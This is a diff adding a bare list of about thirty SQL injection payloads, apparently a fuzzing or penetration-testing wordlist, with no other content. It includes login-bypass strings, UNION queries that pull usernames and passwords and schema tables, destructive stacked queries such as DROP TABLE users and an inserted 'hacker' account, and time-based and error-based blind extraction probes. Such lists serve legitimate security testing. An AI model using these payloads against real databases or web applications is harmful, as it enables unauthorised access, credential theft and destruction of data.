@@ -1,0 +1,30 @@
+' OR '1'='1
+' OR 1=1 --
+' OR 1=1#
+" OR "1"="1
+' UNION SELECT null,null,null --
+' UNION ALL SELECT username,password FROM users --
+1' UNION SELECT null, version() --
+' AND 1=1 --
+' AND 1=2 --
+admin' --
+1; DROP TABLE users --
+1; SELECT * FROM information_schema.tables --
+' OR SLEEP(5) --
+'; WAITFOR DELAY '0:0:5' --
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1) --
+1 OR 1=1
+1' OR '1'='1' /*
+' OR 'x'='x
+'; INSERT INTO users VALUES('hacker','hacked') --
+' UNION SELECT null,table_name FROM information_schema.tables --
+1' AND BENCHMARK(5000000,SHA1('test')) --
+1; ALTER TABLE users ADD admin varchar(10) --
+' OR true --
+1' AND pg_sleep(5) --
+' UNION SELECT CHAR(117,115,101,114) --
+admin'/*
+1' OR '1'='1' --
+' AND (SELECT COUNT(*) FROM users) > 0 --
